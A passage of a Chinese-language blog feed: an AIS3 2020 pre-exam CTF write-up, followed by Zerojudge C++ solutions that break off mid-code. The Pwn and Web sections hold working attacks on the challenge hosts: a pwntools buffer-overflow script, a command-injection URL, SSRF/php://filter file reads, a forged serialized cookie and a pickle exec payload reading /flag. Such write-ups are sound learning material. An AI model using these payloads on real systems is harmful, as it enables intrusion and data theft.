<h3 id="AIS3"><a href="#AIS3" class="headerlink" title="AIS3"></a>AIS3</h3><p><code>AIS3{Wow_how_m4ny_h4nds_do_you_h4ve}</code></p>
<h2 id="Stand-up-Brain"><a href="#Stand-up-Brain" class="headerlink" title="Stand up!Brain"></a>Stand up!Brain</h2><blockquote>
<p><strong>62 solves</strong></p>
</blockquote>
<h3 id="題目-6"><a href="#題目-6" class="headerlink" title="題目"></a>題目</h3><blockquote>
<p>又到了 Brain tell 咪 ㄜ joke 的時間了</p>
<p>這次輪到你說個笑話來聽聽了</p>
</blockquote>
<h3 id="File-5"><a href="#File-5" class="headerlink" title="File"></a>File</h3><p><a href="https://pre-exam.ais3.org/files/5ba33eef5695107f022ab8e3151aaba5/joke?token=eyJ1c2VyX2lkIjoxOTUsInRlYW1faWQiOm51bGwsImZpbGVfaWQiOjI4fQ.Xt95kw.-MkSvwqZ7Pe-SIpQehQOO5xg_b8" target="_blank" rel="noopener">joke</a></p>
<h3 id="解法-6"><a href="#解法-6" class="headerlink" title="解法"></a>解法</h3><p><strong>賽後解</strong><br>strings後會發現到裡面存有brain fuck<br>發現到執行後會失敗，因此會去重看字串<br>但是前面有一串連續的重複字串<br>刪除後就可以執行了<br>最後會剩下這些內容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;----[----&gt;+&lt;]&gt;++.++++++++.++++++++++.&gt;-[-----&gt;+&lt;]&gt;.+[---&gt;++&lt;]&gt;+++.&gt;-[---&gt;+&lt;]&gt;-.[----&gt;+++++&lt;]&gt;-.[--&gt;+&lt;]&gt;---.[---&gt;++&lt;]&gt;---.++[-&gt;+++&lt;]&gt;.+[--&gt;+&lt;]&gt;+.[---&gt;++&lt;]&gt;---.++[-&gt;+++&lt;]&gt;.+++.[---&gt;+&lt;]&gt;----.[--&gt;+&lt;]&gt;-----.[-&gt;++&lt;]&gt;+.-[----&gt;+++&lt;]&gt;.--------.&gt;-[---&gt;+&lt;]&gt;.-[-----&gt;+&lt;]&gt;-.++++++++.--[-----&gt;+++&lt;]&gt;.+++.[---&gt;+&lt;]&gt;-.-[--&gt;+&lt;]&gt;---.++[---&gt;+++++&lt;]&gt;.++++++++++++++.+++[-&gt;+++++&lt;]&gt;.[-----&gt;+&lt;]&gt;++.&gt;-[-----&gt;+&lt;]&gt;.---[-&gt;++&lt;]&gt;-.++++++.[---&gt;+&lt;]&gt;+++.+++.[-]</span><br></pre></td></tr></table></figure>

<h3 id="Flag-5"><a href="#Flag-5" class="headerlink" title="Flag"></a>Flag</h3><p><code>AIS3{Th1s_1s_br4iNFUCK_bu7_m0r3_ez}</code></p>
<h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="BOF"><a href="#BOF" class="headerlink" title="BOF"></a>BOF</h2><blockquote>
<p><strong>189 solves</strong></p>
</blockquote>
<h3 id="題目-7"><a href="#題目-7" class="headerlink" title="題目"></a>題目</h3><blockquote>
<p>That is easy-peasy challenge and even my grandma can do.</p>
<p>nc 60.250.197.227 10000</p>
<p>Challenge environment: Ubuntu 18.04</p>
</blockquote>
<h3 id="File-6"><a href="#File-6" class="headerlink" title="File"></a>File</h3><p><a href="https://pre-exam.ais3.org/files/11d14c680ee0519800bf4b7390da49b5/bof-767fdf896cf9838c0294db24eaa1271ebf15a6e638a873e94ab9682ef28464b4?token=eyJ1c2VyX2lkIjoxOTUsInRlYW1faWQiOm51bGwsImZpbGVfaWQiOjh9.Xt960g.YHP8JWgYM3hlRmcPqBEIUUKXmuU" target="_blank" rel="noopener">BOF</a></p>
<h3 id="解法-7"><a href="#解法-7" class="headerlink" title="解法"></a>解法</h3><p>透過IDA-Pro decompile後可以發現<code>system(&quot;sh&quot;)</code><br>查看記憶體位置後再測試一下中間需要塞入多少bytes<br>可以發現本機塞入52個字元後會開始引響<code>rip</code><br>但是在Ubuntu上似乎需要-4(這部分是猜到的)<br>最後寫個腳本即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">'60.250.197.227'</span>, <span class="string">'10000'</span>)</span><br><span class="line">r.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">target = p64(<span class="number">0x400687</span>)</span><br><span class="line">r.sendline(<span class="string">b'A'</span>*<span class="number">48</span> + target)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="Flag-6"><a href="#Flag-6" class="headerlink" title="Flag"></a>Flag</h3><p><code>AIS3{OLd_5ChOOl_tr1ck_T0_m4Ke_s7aCk_A116nmeNt}</code></p>
<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="Brontosaurus"><a href="#Brontosaurus" class="headerlink" title="Brontosaurus"></a>Brontosaurus</h2><blockquote>
<p><strong>380 solves</strong></p>
</blockquote>
<h3 id="題目-8"><a href="#題目-8" class="headerlink" title="題目"></a>題目</h3><blockquote>
<p>Brontosaurus peek at last year’s problems with a long neck and picked up “KcufsJ”.</p>
</blockquote>
<h3 id="File-7"><a href="#File-7" class="headerlink" title="File"></a>File</h3><p><a href="https://pre-exam.ais3.org/files/485ad6e60bae0bcff72147bc9a39fdb1/KcufsJ?token=eyJ1c2VyX2lkIjoxOTUsInRlYW1faWQiOm51bGwsImZpbGVfaWQiOjJ9.Xt99Kg.fDdDMx4trtkxy8cmQmrPCwvdkNg" target="_blank" rel="noopener">KcufsJ</a></p>
<h3 id="解法-8"><a href="#解法-8" class="headerlink" title="解法"></a>解法</h3><p>開啟檔案後會發現是JSFuck<br>但是直接拿去執行會出錯<br>需要先reverse字串後再執行即可</p>
<h3 id="Flag-7"><a href="#Flag-7" class="headerlink" title="Flag"></a>Flag</h3><p><code>AIS3{Br0n7Os4uru5_ch3at_3asi1Y}</code></p>
<h2 id="T-Rex"><a href="#T-Rex" class="headerlink" title="T-Rex"></a>T-Rex</h2><blockquote>
<p><strong>381 solves</strong></p>
</blockquote>
<h3 id="題目-9"><a href="#題目-9" class="headerlink" title="題目"></a>題目</h3><blockquote>
<p>Tyrannosaurus-rex is an nihilist.</p>
</blockquote>
<h3 id="File-8"><a href="#File-8" class="headerlink" title="File"></a>File</h3><p><a href="https://pre-exam.ais3.org/files/46ce9cf3bdd86cf183820863cf7d45c6/prob?token=eyJ1c2VyX2lkIjoxOTUsInRlYW1faWQiOm51bGwsImZpbGVfaWQiOjI3fQ.Xt9-mw.eiY4Nsp3Odo637z3ZL6xn9U_ZrY" target="_blank" rel="noopener">Prob</a></p>
<h3 id="解法-9"><a href="#解法-9" class="headerlink" title="解法"></a>解法</h3><p>很明顯的，只要對照Table即可<br>(當然，還是寫code不傷眼)</p>
<h3 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">table=&#123;<span class="string">'!!'</span>:<span class="string">'V'</span>,<span class="string">'!@'</span>:<span class="string">'5'</span>,<span class="string">'!#'</span>:<span class="string">'I'</span>,<span class="string">'!$'</span>:<span class="string">'K'</span>,<span class="string">'!%'</span>:<span class="string">'E'</span>,<span class="string">'!&amp;'</span>:<span class="string">'U'</span>,<span class="string">'@!'</span>:<span class="string">'F'</span>,<span class="string">'@@'</span>:<span class="string">'0'</span>,<span class="string">'@#'</span>:<span class="string">'W'</span>,<span class="string">'@$'</span>:<span class="string">'G'</span>,<span class="string">'@%'</span>:<span class="string">'3'</span>,<span class="string">'@&amp;'</span>:<span class="string">'Z'</span>,<span class="string">'#!'</span>:<span class="string">'Y'</span>,<span class="string">'#@'</span>:<span class="string">'M'</span>,<span class="string">'##'</span>:<span class="string">'H'</span>,<span class="string">'#$'</span>:<span class="string">'B'</span>,<span class="string">'#%'</span>:<span class="string">'C'</span>,<span class="string">'#&amp;'</span>:<span class="string">'8'</span>,<span class="string">'$!'</span>:<span class="string">'J'</span>,<span class="string">'$@'</span>:<span class="string">'2'</span>,<span class="string">'$#'</span>:<span class="string">'S'</span>,<span class="string">'$$'</span>:<span class="string">'X'</span>,<span class="string">'$%'</span>:<span class="string">'7'</span>,<span class="string">'$&amp;'</span>:<span class="string">'R'</span>,<span class="string">'%!'</span>:<span class="string">'6'</span>,<span class="string">'%@'</span>:<span class="string">'9'</span>,<span class="string">'%#'</span>:<span class="string">'4'</span>,<span class="string">'%$'</span>:<span class="string">'T'</span>,<span class="string">'%%'</span>:<span class="string">'P'</span>,<span class="string">'%&amp;'</span>:<span class="string">'D'</span>,<span class="string">'&amp;!'</span>:<span class="string">'1'</span>,<span class="string">'&amp;@'</span>:<span class="string">'L'</span>,<span class="string">'&amp;#'</span>:<span class="string">'Q'</span>,<span class="string">'&amp;$'</span>:<span class="string">'A'</span>,<span class="string">'&amp;%'</span>:<span class="string">'N'</span>,<span class="string">'&amp;&amp;'</span>:<span class="string">'O'</span>&#125;</span><br><span class="line"></span><br><span class="line">ordi = <span class="string">'&amp;$ !# $# @% &#123; %$ #! $&amp; %# &amp;% &amp;% @@ $# %# !&amp; $&amp; !&amp; !@ _ $&amp; @% $$ _ @$ !# !! @% _ #! @@ !&amp; _ $# &amp;&amp; #@ !% %$ ## !# &amp;% @$ _ $&amp; &amp;$ &amp;% %&amp; &amp;&amp; #@ _ !@ %$ %&amp; %! $$ &amp;# !# !! &amp;% @% ## $% !% !&amp; @! #&amp; &amp;&amp; %&amp; !% %$ %# %$ @% ## %@ @@ $% ## !&amp; #% %! %@ &amp;@ %! &amp;@ %$ $# ## %# !$ &amp;% @% !% !&amp; $&amp; &amp;% %# %@ #$ !# &amp;&amp; !&amp; #! %! ## #$ @! #% !! $! $&amp; @&amp; %% @@ &amp;&amp; #&amp; @% @! @# #@ @@ @&amp; !@ %@ !# !# $# $! !@ &amp;$ $@ !! @! &amp;# @$ &amp;! &amp;# $! @@ &amp;@ !% #% #! &amp;@ &amp;$ @@ &amp;$ &amp;! !&amp; #! !# ## %$ !# !# %$ &amp;! !# @# ## @@ $! $$ %# %$ @% @&amp; $! &amp;! !$ $# #$ $&amp; #@ %@ @$ !% %&amp; %! @% #% $! !! #$ &amp;# ## &amp;# &amp;&amp; $&amp; !! !% $! @&amp; !% &amp;@ !&amp; $! @# !@ !&amp; @$ $% #&amp; #$ %@ %% %% &amp;! $# !# $&amp; #@ &amp;! !# @! !@ @@ @@ ## !@ $@ !&amp; $# %&amp; %% !# !! $&amp; !$ $% !! @$ @&amp; !&amp; &amp;@ #$ &amp;&amp; @% $&amp; $&amp; !% &amp;! &amp;&amp; &amp;@ &amp;% @$ &amp;% &amp;$ &amp;@ $$ &#125;'</span></span><br><span class="line">format_ordi = ordi.split()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> format_ordi:</span><br><span class="line">    <span class="keyword">if</span>(i==<span class="string">'&#123;'</span> <span class="keyword">or</span> i==<span class="string">'&#125;'</span> <span class="keyword">or</span> i==<span class="string">'_'</span>):</span><br><span class="line">        print(i,end=<span class="string">''</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(table[i],end=<span class="string">''</span>)</span><br></pre></td></tr></table></figure>

<h3 id="Flag-8"><a href="#Flag-8" class="headerlink" title="Flag"></a>Flag</h3><p><code>AIS3{TYR4NN0S4URU5_R3X_GIV3_Y0U_SOMETHING_RANDOM_5TD6XQIVN3H7EUF8ODET4T3H907HUC69L6LTSH4KN3EURN49BIOUY6HBFCVJRZP0O83FWM0Z59IISJ5A2VFQG1QJ0LECYLA0A1UYIHTIIT1IWH0JX4T3ZJ1KSBRM9GED63CJVBQHQORVEJZELUJW5UG78B9PP1SIRM1IF500H52USDPIVRK7VGZULBO3RRE1OLNGNALX}</code></p>
<h2 id="Octopus"><a href="#Octopus" class="headerlink" title="Octopus"></a>Octopus</h2><blockquote>
<p><strong>103 solves</strong></p>
</blockquote>
<h3 id="題目-10"><a href="#題目-10" class="headerlink" title="題目"></a>題目</h3><blockquote>
<p>BB84 quantum key distribution has 8 main directions,</p>
<p>just like a cute octopus A __ A.</p>
</blockquote>
<h3 id="File-9"><a href="#File-9" class="headerlink" title="File"></a>File</h3><p><a href="https://pre-exam.ais3.org/files/5f1d8f09cd100ff6c3aef9e43dd39109/output?token=eyJ1c2VyX2lkIjoxOTUsInRlYW1faWQiOm51bGwsImZpbGVfaWQiOjV9.Xt9_Ig.Cr3dh43HJY9dNY-BdNyRkwCrAYQ" target="_blank" rel="noopener">output</a><br><a href="https://pre-exam.ais3.org/files/b82ef51ba5a71f0767c68979d428c95a/prob.py?token=eyJ1c2VyX2lkIjoxOTUsInRlYW1faWQiOm51bGwsImZpbGVfaWQiOjZ9.Xt9_Ig.hqnGUH-0Ky4_GIOjJo0rN3HqzaU" target="_blank" rel="noopener">prob.py</a></p>
<h3 id="解法-10"><a href="#解法-10" class="headerlink" title="解法"></a>解法</h3><p>先參照<a href="https://zh.wikipedia.org/wiki/%E9%87%8F%E5%AD%90%E5%AF%86%E9%91%B0%E5%88%86%E7%99%BC" target="_blank" rel="noopener">維基百科</a>了解BB84如何加密<br>題目中已經給好Basis<br>我們只要參照Table就可以分別對應出其箭號方向(Basis需相同)，進而找到是0/1<br><img src="https://i.imgur.com/Q2V5Pnc.png" alt=""><br>最終檔案中最後一筆資料與結果分別轉binary後xor轉字串即可</p>
<h3 id="Flag-9"><a href="#Flag-9" class="headerlink" title="Flag"></a>Flag</h3><p><code>AIS3{EveryONe_kn0w_Quan7um_k3Y_Distr1but1on--BB84}</code></p>
<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Squirrel"><a href="#Squirrel" class="headerlink" title="Squirrel"></a>Squirrel</h2><blockquote>
<p><strong>220 solves</strong></p>
</blockquote>
<h3 id="題目-11"><a href="#題目-11" class="headerlink" title="題目"></a>題目</h3><blockquote>
<p>Hack those creepy rats.</p>
<p><a href="https://squirrel.ais3.org/" target="_blank" rel="noopener">https://squirrel.ais3.org/</a></p>
</blockquote>
<h3 id="解法-11"><a href="#解法-11" class="headerlink" title="解法"></a>解法</h3><p>從scource code可以發現到我們可以訪問目錄中的檔案<br><img src="https://i.imgur.com/IXwhBr6.png" alt=""><br>先去看看api.php<br>會發現到裡面有<code>exec</code>，可以猜測這裡會出漏洞<br><img src="https://i.imgur.com/g7Oy0E6.png" alt=""><br>先閉合，再輸入指令就可以了</p>
<blockquote>
<p><a href="https://squirrel.ais3.org/api.php?get=&#39;;ls" target="_blank" rel="noopener">https://squirrel.ais3.org/api.php?get=&#39;;ls</a> /‘<br>檔案可以先從當前目錄找，如果沒有，可以猜是在根目錄或是find猜猜看檔案名稱</p>
</blockquote>
<h3 id="Flag-10"><a href="#Flag-10" class="headerlink" title="Flag"></a>Flag</h3><p><code>AIS3{5qu1rr3l_15_4_k1nd_0f_b16_r47}</code></p>
<h2 id="Shark"><a href="#Shark" class="headerlink" title="Shark"></a>Shark</h2><blockquote>
<p><strong>261 solves</strong></p>
</blockquote>
<h3 id="題目-12"><a href="#題目-12" class="headerlink" title="題目"></a>題目</h3><blockquote>
<p>Let’s dive deep again this year.</p>
<p><a href="https://shark.ais3.org/" target="_blank" rel="noopener">https://shark.ais3.org/</a></p>
</blockquote>
<h3 id="解法-12"><a href="#解法-12" class="headerlink" title="解法"></a>解法</h3><p>一開始不知道這題要做什麼<br>於是到網路上找到去年的write-up，發現倒是在網址後面path造成的SSRF漏洞<br>可以先到<a href="https://shark.ais3.org/?path=php://filter/resource=/etc/hosts" target="_blank" rel="noopener">https://shark.ais3.org/?path=php://filter/resource=/etc/hosts</a> 獲取ip<br>根據題目，flag藏在附近的server上，所以可以從1開始慢慢手動找<br>最終可以在<a href="https://shark.ais3.org/?path=http://172.22.0.2/flag" target="_blank" rel="noopener">https://shark.ais3.org/?path=http://172.22.0.2/flag</a> 獲得flag</p>
<h3 id="Flag-11"><a href="#Flag-11" class="headerlink" title="Flag"></a>Flag</h3><p><code>AIS3{5h4rk5_d0n&#39;7_5w1m_b4ckw4rd5}</code></p>
<h2 id="Elephant"><a href="#Elephant" class="headerlink" title="Elephant"></a>Elephant</h2><blockquote>
<p><strong>165 solves</strong></p>
</blockquote>
<h3 id="題目-13"><a href="#題目-13" class="headerlink" title="題目"></a>題目</h3><blockquote>
<p>Do elephants love cookies?</p>
<p><a href="https://elephant.ais3.org/" target="_blank" rel="noopener">https://elephant.ais3.org/</a></p>
<p>IMPORTANT</p>
<pre><code>There&apos;s a hint in the webpage</code></pre></blockquote>
<h3 id="解法-13"><a href="#解法-13" class="headerlink" title="解法"></a>解法</h3><p>在cookie裡面可以看到一個<code>elephant_user</code>，將值base64 decode後會發現是php序列化後的資料格式<br>但是由於不知道底層是將甚麼class序列化，目前還用不上它<br>由於沒有其他資訊了，想到最初web學到的知識<br>開始搜尋 <code>/robots.txt</code>, <code>/.git</code>, <code>/.svn</code> …<br>發現到<code>/.git</code>有githack漏洞<br>在網路上找到githack工具直接獲得網頁原始碼</p>
<p>透過原始碼可以發現到token會經過md5加密<br>而要獲取flag需要在<code>strcmp($flag, $this-&gt;token)==0</code>才能獲得<br>顯然token需要是特殊值才能破解它<br>發現到token是NAN可以解<br>於是將class複製後將<code>__construct</code>中關於<code>token</code>的部分註解<br>再將class serialize base64_encode<br>將cookie複寫即可</p>
<h3 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h3><p><code>AIS3{0nly_3l3ph4n75_5h0uld_0wn_1v0ry}</code></p>
<h2 id="Snake"><a href="#Snake" class="headerlink" title="Snake"></a>Snake</h2><blockquote>
<p><strong>137 solves</strong></p>
</blockquote>
<h3 id="題目-14"><a href="#題目-14" class="headerlink" title="題目"></a>題目</h3><blockquote>
<p>How to read that flag?</p>
<p><a href="https://snake.ais3.org/" target="_blank" rel="noopener">https://snake.ais3.org/</a></p>
</blockquote>
<h3 id="解法-14"><a href="#解法-14" class="headerlink" title="解法"></a>解法</h3><p>打開後會看到一個python檔，且可以接收pickle data<br>如果要符合 <code>data is not data</code> 理論上不可能<br>除非寫一個function讓他可以每次詢問與上次相反<br>但是pickle中能寫入的內容會是靜態的，function沒辦法寫入<br>所以我們目標會是後面的 <code>return str(data)</code> ，只要data是flag就可以了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import pickle</span><br><span class="line">import base64</span><br><span class="line">import os</span><br><span class="line">class test():</span><br><span class="line">	def __reduce__(self):</span><br><span class="line">		return (exec,(&#39;globals()[\&#39;str\&#39;]&#x3D;lambda data : open(\&#39;&#x2F;flag\&#39;).read()&#39;,))</span><br><span class="line"></span><br><span class="line">print(base64.b64encode(pickle.dumps(test())))</span><br><span class="line">data &#x3D; (pickle.loads(pickle.dumps(test())))</span><br></pre></td></tr></table></figure>

<p>最後將pickle檔案放上去即可!</p>
<h3 id="Flag-12"><a href="#Flag-12" class="headerlink" title="Flag"></a>Flag</h3><p><code>AIS3{7h3_5n4k3_w1ll_4lw4y5_b173_b4ck.}</code></p>
<h2 id="心得"><a href="#心得" class="headerlink" title="心得"></a>心得</h2><p>第一次打AIS3 pre-exam，收穫意外的多<br>尤其在web部分花了特別多的心力在上面，也藉此學到像是 phpserialize 和 python的pickle data<br>Crypto很多都是參考去年的write-up 自己腦洞大開解出來的並不多<br>Pwn是我很不熟悉的領域，所以碰的題目不多<br>Reverse印象最深刻的是音遊w，第一次用cheat engine XDD<br>不過那題的正解似乎是先返組譯java後trace code找到flag如何產生<br>整體難度個人覺得中偏難w<br>這次的排名在第96，明年繼續加油OwO</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>AIS3</tag>
        <tag>CTF write-up</tag>
      </tags>
  </entry>
  <entry>
    <title>Zerojudge c461</title>
    <url>/2020/06/28/Zerojudge%20c461/</url>
    <content><![CDATA[<h1 id="Zerojudge-c461"><a href="#Zerojudge-c461" class="headerlink" title="Zerojudge c461"></a>Zerojudge c461</h1><h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><p><a href="https://zerojudge.tw/ShowProblem?problemid=c461" target="_blank" rel="noopener">https://zerojudge.tw/ShowProblem?problemid=c461</a><br>給三個數值，問經過 <code>AND</code> <code>OR</code> <code>XOR</code> 之後的值是否與要求相同</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>直接照著題目做下去即可</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LL long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOS ios::sync_with_stdio(false),cin.tie(0),cout.tie(0);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">bool</span> c;</span><br><span class="line"><span class="keyword">int</span> A,B;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	IOS</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;A&gt;&gt;B&gt;&gt;c)&#123;</span><br><span class="line">		<span class="keyword">bool</span> a=(A&gt;<span class="number">0</span>) ? <span class="literal">true</span> : <span class="literal">false</span>;</span><br><span class="line">		<span class="keyword">bool</span> b=(B&gt;<span class="number">0</span>) ? <span class="literal">true</span> : <span class="literal">false</span>;</span><br><span class="line">		<span class="keyword">bool</span> out=<span class="literal">false</span>;</span><br><span class="line">		<span class="keyword">if</span>((a &amp;&amp; b) == c)&#123;</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;<span class="string">"AND\n"</span>;</span><br><span class="line">			out=<span class="literal">true</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>((a || b) == c)&#123;</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;<span class="string">"OR\n"</span>;</span><br><span class="line">			out=<span class="literal">true</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>((a ^ b) == c)&#123;</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;<span class="string">"XOR\n"</span>;</span><br><span class="line">			out=<span class="literal">true</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(!out)</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;<span class="string">"IMPOSSIBLE\n"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><p>$O(1)$</p>
<h6 id="tags-Zerojudge"><a href="#tags-Zerojudge" class="headerlink" title="tags: Zerojudge"></a>tags: <code>Zerojudge</code></h6>]]></content>
      <categories>
        <category>Zerojudge</category>
        <category>APCS</category>
      </categories>
      <tags>
        <tag>Zerojudge</tag>
        <tag>APCS</tag>
      </tags>
  </entry>
  <entry>
    <title>Zerojudge c295</title>
    <url>/2020/06/29/Zerojudge%20c295/</url>
    <content><![CDATA[<h1 id="Zerojudge-c295"><a href="#Zerojudge-c295" class="headerlink" title="Zerojudge c295"></a>Zerojudge c295</h1><h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><p><a href="https://zerojudge.tw/ShowProblem?problemid=c295" target="_blank" rel="noopener">https://zerojudge.tw/ShowProblem?problemid=c295</a><br>給 $N$ 群數字，每群數字包含 $M$ 個正整數，從每群數字中選最大的出來加總<br>輸出其總和 $S$ 以及各群數字中最大值能整除 $S$ 的數字</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>每群數字只需存最大值，接下來 $O(n)$ 判斷每個最大值是否能整除 $S$ 即可</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LL long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOS ios::sync_with_stdio(false),cin.tie(0),cout.tie(0);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n,m,s=<span class="number">0</span>,arr[<span class="number">25</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	IOS</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;n&gt;&gt;m;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;n ; i++)&#123;</span><br><span class="line">		<span class="keyword">int</span> Max=<span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>,tmp ; j&lt;m ; j++)&#123;</span><br><span class="line">			<span class="built_in">cin</span>&gt;&gt;tmp;</span><br><span class="line">			Max=max(Max,tmp);</span><br><span class="line">		&#125;</span><br><span class="line">		arr[i]=Max;</span><br><span class="line">		s+=Max;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;s&lt;&lt;<span class="string">'\n'</span>;</span><br><span class="line">	<span class="keyword">bool</span> found = <span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;n ; i++)&#123;</span><br><span class="line">		<span class="keyword">if</span>(s%arr[i] == <span class="number">0</span>)&#123;</span><br><span class="line">			<span class="keyword">if</span>(found) <span class="built_in">cout</span>&lt;&lt;<span class="string">' '</span>;</span><br><span class="line">			<span class="keyword">else</span> found=<span class="literal">true</span>;</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;arr[i];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(!found) <span class="built_in">cout</span>&lt;&lt;<span class="string">"-1"</span>;</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;<span class="string">'\n'</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><p>$O(n)$</p>
]]></content>
      <categories>
        <category>Zerojudge</category>
        <category>APCS</category>
      </categories>
      <tags>
        <tag>Zerojudge</tag>
        <tag>APCS</tag>
      </tags>
  </entry>
  <entry>
    <title>Zerojudge c463</title>
    <url>/2020/06/28/Zerojudge%20c463/</url>
    <content><![CDATA[<h1 id="Zerojudge-c463"><a href="#Zerojudge-c463" class="headerlink" title="Zerojudge c463"></a>Zerojudge c463</h1><h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><p><a href="https://zerojudge.tw/ShowProblem?problemid=c463" target="_blank" rel="noopener">https://zerojudge.tw/ShowProblem?problemid=c463</a><br>給一棵樹，求其根與高度和<br>高度定義為節點到距離最近的葉節點距離</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>找根可以利用根沒有父節點的特性，可以透過記錄每個點是否有父節點找到<br>找到根後就可以從根開始DFS，尋找各節點的高度並回傳，且葉節點高度為0</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LL long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOS ios::sync_with_stdio(false),cin.tie(0),cout.tie(0);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n,t;</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> ans=<span class="number">0</span>;</span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; Next[<span class="number">100005</span>];</span><br><span class="line"><span class="keyword">bool</span> par[<span class="number">100005</span>];</span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="keyword">long</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> now,<span class="keyword">int</span> last)</span></span>&#123;</span><br><span class="line">	<span class="keyword">bool</span> end=<span class="literal">true</span>;</span><br><span class="line">	<span class="keyword">long</span> <span class="keyword">long</span> h=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">auto</span> i: Next[now])&#123;</span><br><span class="line">		<span class="keyword">if</span>(i==last)</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		<span class="keyword">long</span> <span class="keyword">long</span> tmp = dfs(i,now);</span><br><span class="line">		h=max(h,tmp);</span><br><span class="line">		ans+=tmp;</span><br><span class="line">		